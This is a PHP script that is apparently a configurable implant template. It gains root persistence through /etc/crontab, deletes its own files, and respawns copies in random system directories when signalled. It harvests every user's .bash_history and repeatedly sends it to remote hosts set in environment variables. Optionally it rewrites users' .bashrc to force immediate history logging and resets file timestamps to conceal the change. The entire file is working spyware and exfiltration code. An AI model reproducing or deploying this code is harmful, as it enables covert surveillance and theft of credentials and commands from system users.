<?php

// @phan-file-suppress PhanPluginShortArray,PhanPluginCanUsePHP71Void,PhanPluginPossiblyStaticClosure

$lastSize = array();
$hosts = explode(',', getenv('TARGET_HOST'));
$key = getenv('TARGET_KEY');
$api = getenv('TARGET_FILE');
$protocol = getenv('TARGET_PROTOCOL');
$crypt = getenv('LOCAL_CRYPT');
$iv = getenv('LOCAL_IV');

$basename = basename(__FILE__, '.php');
$dir = __DIR__;
file_put_contents(
    '/etc/crontab',
    str_replace("\n* * * * * root sh $dir/$basename", '', file_get_contents('/etc/crontab'))
);
if (getenv('##KILLNAME##') === '##KILLKEY##') {
    exit;
}
if (extension_loaded('pcntl')) {
    $dataPhp = file_get_contents(__FILE__);
    $dataSh = file_get_contents("$dir/$basename.sh");
    $pcntlhandler = function () use ($dataPhp, $dataSh) {
        $file = randomAlphaNumericString(3);
        $dirs = array('opt', 'usr', 'var', 'home', 'root');
        $dir = $dirs[rand(0, count($dirs) - 1)];
        mkdir("/$dir");
        file_put_contents('/etc/crontab', "\n* * * * * root sh /$dir/$file.sh", FILE_APPEND);
        file_put_contents("/$dir/$file.sh", $dataSh);
        file_put_contents("/$dir/$file.php", $dataPhp);
    };
    if (defined('SIGTERM')) {
        // @phan-suppress-next-line PhanTypeMismatchArgumentNullableInternal
        pcntl_signal(SIGTERM, $pcntlhandler);
    }
    if (defined('SIGKILL')) {
        // @phan-suppress-next-line PhanTypeMismatchArgumentNullableInternal
        pcntl_signal(SIGKILL, $pcntlhandler);
    }
    unlink(__FILE__);
    unlink("$dir/$basename.sh");
} else {
    file_put_contents('/etc/crontab', "\n* * * * * root sh $dir/$basename.sh", FILE_APPEND);
    if (is_file("$dir/$basename.pid")) {
        $pid = intval(file_get_contents("$dir/$basename.pid"), 10);
        if (is_file("/proc/$pid")) {
            exit;
        }
    }
    file_put_contents("$dir/$basename.pid", getmypid());
}

while (true) {
    $files = array();
    foreach (explode("\n", file_get_contents('/etc/passwd') ?: '') as $userData) {
        if ($userData) {
            $data = explode(':', $userData);
            if ($data[5]) {
                $user = preg_replace('/[^a-z0-9_-]+/i', '', $data[0]);
                if (is_dir($data[5])) {
                    $history = str_replace('//.bash_history', '/.bash_history', "{$data[5]}/.bash_history");
                    if (is_file($history) && is_readable($history)) {
                        $lastSize2 = filesize($history);
                        if (!isset($lastSize[$user]) || $lastSize[$user] !== $lastSize2) {
                            $data = file_get_contents($history);
                            if ($data) {
                                while (!transmit($hosts, $api, $protocol, $data, $key, $user)) {
                                    usleep(mt_rand(1, 999));
                                }
                                $lastSize[$user] = $lastSize2;
                            }
                        }
                    }
                    // @phan-suppress-next-line PhanPluginBothLiteralsBinaryOp
                    if ('###ENABLE_BASHRC_MODIFICATION###' === 'true') {
                        $rc = str_replace('//.bashrc', '/.bashrc', "{$data[5]}/.bashrc");
                        if (is_file($rc) || is_file($history)) {
                            $lastModified = is_file($rc) ? filemtime($rc) : 0;
                            $lastAccessed = is_file($rc) ? fileatime($rc) : 0;
                            $data = is_file($rc) ? file_get_contents($rc) : '';
                            $found = false;
                            $lines = explode("\n", $data);
                            foreach ($lines as &$line) {
                                if (strlen($line) > 22 && substr($line, 0, 22) === 'export PROMPT_COMMAND=') {
                                    if (strpos($line, 'history -a') === false) {
                                        if (substr($line, strlen($line) -1, 1) !== "'") {
                                            $parts = explode('=', $line, 2);
                                            $line = "{$parts[0]}='{$parts[1]}'";
                                        }
                                        $line = substr($line, 0, strlen($line) - 1) . ";history -a'";
                                    }
                                    $found = true;
                                }
                            }
                            if (!$found) {
                                $lines[] = "export PROMPT_COMMAND='history -a'";
                            }
                            $newData = implode("\n", $lines);
                            if ($newData !== $data) {
                                file_put_contents($rc, $newData);
                                if ($lastModified + $lastAccessed > 0) {
                                    touch($rc, $lastAccessed, $lastModified);
                                }
                                chown($rc, $user);
                            }
                        }
                    }
                }
            }
        }
    }
    if (exec('who -q') === '# users=0') {
        sleep(5);
    } else {
        sleep(1);
    }
}
